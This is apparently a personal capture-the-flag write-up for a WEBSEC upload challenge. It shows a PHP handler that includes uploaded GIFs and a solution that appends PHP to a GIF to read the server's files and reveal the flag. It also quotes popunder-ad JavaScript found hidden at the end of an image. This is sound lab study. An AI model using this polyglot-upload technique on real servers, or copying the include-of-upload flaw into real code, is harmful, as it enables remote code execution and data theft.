```PHP
<?php if (isset ($_FILES) && !empty ($_FILES)): ?>  
    <div class="row">  
        <?php  
        $uploadedFile = sprintf('%1$s/%2$s', '/uploads', sha1($_FILES['fileToUpload']['name']) . '.gif');  
  
        if (file_exists ($uploadedFile)) { unlink ($uploadedFile); }  
  
        if ($_FILES['fileToUpload']['size'] <= 50000) {  
            if (getimagesize ($_FILES['fileToUpload']['tmp_name']) !== false) {  
                if (exif_imagetype($_FILES['fileToUpload']['tmp_name']) === IMAGETYPE_GIF) {  
                    move_uploaded_file ($_FILES['fileToUpload']['tmp_name'], $uploadedFile);  
                    echo '<p class="lead">Dump of <a href="/level08' . $uploadedFile . '">'. htmlentities($_FILES['fileToUpload']['name']) . '</a>:</p>';  
                    echo '<pre>';  
                    include_once($uploadedFile);  
                    echo '</pre>';  
                    unlink($uploadedFile);  
                } else { echo '<p class="text-danger">The file is not a GIF</p>'; }  
            } else { echo '<p class="text-danger">The file is not an image</p>'; }  
        } else { echo '<p class="text-danger">The file is too big</p>'; }  
        ?>  
    </div>  
<?php endif ?>
```

At this point uploading a file in PHP seems like RCE...

### Directions
- includes the file
	- Write code at the end of the gif - find which file has the flag and print it 

# Solution
Take a random `.gif` from wikipeia, and insert code at the end
![[Eokxd.gif]]
```PHP
<?php
$files = scandir(__DIR__);

foreach ($files as $f) {
    if ($f === '.' || $f === '..') continue;

    echo "<h3>$f</h3>";
    echo "<pre>" . htmlspecialchars(file_get_contents($f)) . "</pre>";
}
?>
```

Bingo:
![[Pasted image 20251203142950.png]]
```
WEBSEC{BypassingImageChecksToRCE}
```


Funny, when I opened the gif with vim I saw that there is already code at the end of it:
```javascript
var once_per_session=0
function get_cookie(Name) {
  var search = Name + "="
  var returnvalue = "";
  if (document.cookie.length > 0) {
    offset = document.cookie.indexOf(search)
    if (offset != -1) {
      offset += search.length
      end = document.cookie.indexOf(";", offset);
      if (end == -1)
         end = document.cookie.length;
      returnvalue=unescape(document.cookie.substring(offset, end))
      }
   }
  return returnvalue;
}
function loadornot(){
if (get_cookie('popunder')==''){
loadpopunder()
document.cookie="popunder=yes"
}
}
function loadpopunder(){
win2=window.open("http://www.jeeran.com/asp-bin/popads/pop_commbannerad.asp","memberads","width=500,height=150,personalbar=no,location=no,toolbar=no,status=no,menubar=no,scrollbars=no")
win2.blur()
window.focus()
}
if (once_per_session==0)
loadpopunder()
else
loadornot()
</script>
```